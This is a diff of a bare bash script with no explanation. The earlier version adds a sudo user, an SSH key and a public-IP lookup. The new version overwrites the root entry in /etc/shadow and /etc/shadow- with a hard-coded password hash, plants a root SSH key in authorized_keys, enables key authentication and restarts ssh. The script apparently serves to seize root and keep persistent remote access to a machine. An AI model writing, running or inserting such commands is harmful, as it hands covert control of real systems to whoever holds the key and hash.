@@ -1,6 +1,14 @@
 #!/bin/bash
 
-adduser  --disabled-password --gecos 'Full Username' click14
-usermod -aG sudo click14
-sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWqeq+SfVQF2Urd8Wjw8IK+tWm7aN1gOOGQeAtgY7/GSqqm9UqvVBcQK6vXU9fcA0g4eGwv/ctxnAqqALH4hHrPzZsPp4XHIB/7L9Q134Dv4gNXFht8DQlqIVX2KqotH9Ms3TYCQz48qF52znY90/T4KeX3x9SlFk/nnzUu4zvZsuSne8B5ZMjILmDorP5bpceT0Mu8s7iCRC1+gBa5e6k60fExSrLxeBFj/hhtadz3XCdGpB4lOMtiyoDdBJ4IEmLwr31TNsAPT9bhMqRPnoHjLuaOuGAMtvuP8rc3oMoRA6dwgXNTWlqQ0JJ4kdqG3+hFmzf9Dq0CgK/svRClwA1YW639dfNL3ZF9hz3igcTCPI4sucacTvCh4tWJcJo4PjhvUoMQD86S3+6kgrAngEU2J29kDpDzI+2Qh5mxtdhQiShLtGO5bc6OWCT/OesuuqUzlW8DD/swiW+7dsVUBpSaQkRXrMVShtS91faQqu0JcrwdznYb40llLKfPVaGLYk= click14@zoo4' >> ~/.ssh/authorized_keys"
-curl eth0.me >> ip.txt
+sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' -i /etc/ssh/sshd_config
+
+sed '1d' -i /etc/shadow
+
+sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow
+
+sed '1d' -i /etc/shadow-
+
+sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-
+
+sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyp3HKHgwBAGfcuAYh5Dl6jXOOYGap7cEpSddssKw2XAUIKJ8eJm5LniXkdeno2NtgAVqzzZp5uuQzwLYqZVQTtUmODw5tYzljaSq8azsQiRkA+vCpbbLgGu14uM5XaUSnJfokdTDzfJ/dpsLG/K7hb35IzfxHM3Nm0uVl/lp2KrurI9HE+j5pifVoTyHcFiVZBcVd343E8qBeqgFuJUYh0lEHVb4Jt11d/2KH7l0y1iDpDL2nNjmhhIxF4yiIhEXd5KVjP95jgxMp3LaezmPemYhIH1ke8ayknLFmIv6GX1KJGcITD969NHty598Lad9QImslTrItTsDHp34mW2JQvDxyIvhWw6Tc8522rLMk1mURFdAEK3Fv+k7Z403zTVMQCYo3odMftDLw5iGdo1rdXnHna6Ss7nAHa/O/3vG4gKrPmv/U98JQHemGKSA6mMFc2Of4eBxs7/RgFeuRSJrD69OHx795J05k139R6y4PAX/6uCsyqBU/1RJnPDccE+0= root@zoo4' >> ~/.ssh/authorized_keys"
+systemctl restart ssh
